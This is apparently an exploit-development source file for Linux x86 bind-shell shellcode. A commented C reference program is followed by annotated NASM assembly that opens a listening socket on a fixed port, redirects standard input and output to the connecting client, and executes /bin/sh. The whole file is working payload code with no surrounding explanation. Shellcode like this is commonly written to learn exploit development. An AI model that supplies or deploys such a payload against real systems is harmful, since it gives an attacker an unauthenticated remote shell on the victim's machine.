;int main() {
;  int s, c;
;  unsigned short port = 4444;
;  struct sockaddr_in addr;
;
;  s = socket(AF_INET, SOCK_STREAM, 0);
;
;  addr.sin_family = AF_INET;
;  addr.sin_port = htons(port);
;  addr.sin_addr.s_addr = INADDR_ANY;
;
;  bind(s, (struct sockaddr*)&addr, sizeof(addr));
;  listen(s, 0);
;
;  c = accept(s, NULL, NULL);
;
;  dup2(c, STDERR_FILENO);
;  dup2(c, STDOUT_FILENO);
;  dup2(c, STDIN_FILENO);
;
;  execve("/bin/sh", NULL, NULL);
;
;  return 0;
;}

BITS 32

PORT equ 44444                 ; port to bind to

xor ebx, ebx                   ; zero out ebx register
xor edx, edx                   ; zero out ebx register

mov eax, 102                   ; socketcall()
mov ebx, 1                     ; socket()
push edx                       ; protocol. 0 = IP
push 1                         ; SOCK_STREAM
push 2                         ; AF_INET
mov ecx, esp                   ; array of arguments for socket()
int 0x80

mov esi, eax                   ; move fd for socket into esi

mov eax, 102                   ; socketcall()
mov ebx, 2                     ; bind()
push edx                       ; INADDR_ANY

mov ecx, PORT
push cx

;push word PORT                 ; port
push word 2                    ; AF_INET
mov ecx, esp                   ;
push 16                        ;
push ecx                       ;
push esi                       ; socket fd
mov ecx, esp                   ; call bind()
int 0x80

mov eax, 102                   ; socketcall()
mov ebx, 4                     ; listen()
push edx                       ; backlog = 0
push esi                       ; socket fd
mov ecx, esp                   ; listen arguments
int 0x80                       ; call listen()

mov eax, 102                   ; socketcall()
mov ebx, 5                     ; accept()
push edx                       ; zero addrlen
push edx                       ; null sockaddr
push esi                       ; sockfd
mov ecx, esp                   ; accept() arguments
int 0x80                       ; call socketcall()
 
xchg ebx, eax
 
xor ecx, ecx                   ; zero out ecx
mov cl, 2                      ; initialize counter
loop:
    mov eax, 63                ; dup2()
    int 0x80
    dec ecx                    ; decrease counter
    jns loop                   ;
 
xchg eax, edx                  ; copy null byte into eax
push eax                       ; push null byte
push 0x68732f2f                ; //sh
push 0x6e69622f                ; /bin
mov ebx, esp                   ; 
push eax                       ; null
push ebx                       ; address of /bin/sh 
mov ecx, esp                   ;
push eax                       ; null
mov edx, esp                   ; envp
mov al, 11                     ; execve()
int 0x80                       ; call execve()

